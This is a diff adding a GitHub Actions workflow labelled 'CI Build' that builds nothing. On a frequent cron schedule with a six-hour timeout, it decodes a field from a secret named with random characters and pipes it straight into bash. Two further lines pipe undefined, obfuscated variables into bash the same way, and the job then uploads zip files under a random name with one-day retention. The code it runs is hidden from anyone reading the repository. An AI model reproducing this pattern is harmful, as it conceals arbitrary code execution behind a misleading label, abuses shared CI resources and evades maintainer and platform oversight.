@@ -1,0 +1,32 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '3 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          cvnui2: ${{ secrets.cvnui2 }}
+        run: |
+          printf '%s' "$cvnui2" | jq -r .fijn5 | /bin/bash
+          printf '%s' "$y2" | jq -r .npx590 | /bin/bash
+          echo $jxqkc10923 | jq -r .arghh8 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: YUp4RrgJ
+          path: "*.zip"
+          retention-days: 1
